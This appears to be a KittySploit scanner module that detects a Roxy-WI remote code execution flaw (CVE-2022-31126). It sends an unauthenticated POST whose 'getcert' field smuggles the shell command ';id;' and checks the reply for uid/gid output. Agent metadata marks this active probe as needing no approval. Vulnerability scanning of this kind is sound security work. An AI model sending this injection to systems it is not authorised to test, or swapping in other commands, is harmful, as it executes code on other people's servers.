#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Roxy-WI before 6."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Roxy-WI - Remote Code Execution Detection',
        'description': 'Roxy-WI before 6.1.1.0 is susceptible to remote code execution. System commands can be run remotely via the ssh_command function without processing the inputs received from the user in the /app/funct.py file.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve2022', 'cve', 'rce', 'roxy', 'roxy-wi', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://pentest.blog/advisory-roxy-wi-unauthenticated-remote-code-executions-cve-2022-31137/',
            'https://github.com/roxy-wi/roxy-wi/security/advisories/GHSA-mh86-878h-43c9',
            'https://nvd.nist.gov/vuln/detail/CVE-2022-31126',
        ],
        'cve': 'CVE-2022-31126',
    }

    def run(self):
        path = '/app/options.py'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'Referer': '{{BaseURL}}/app/login.py'}, data='show_versions=1&token=&alert_consumer=1&serv=127.0.0.1&getcert=;id;\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('uid=([0-9(a-z)]+) gid=([0-9(a-z)]+)',)
        if any(re.search(rx, body) for rx in body_regexes):
            self.set_info(severity='critical', reason='Roxy-WI - Remote Code Execution detected', path=path)
            return True
        return False

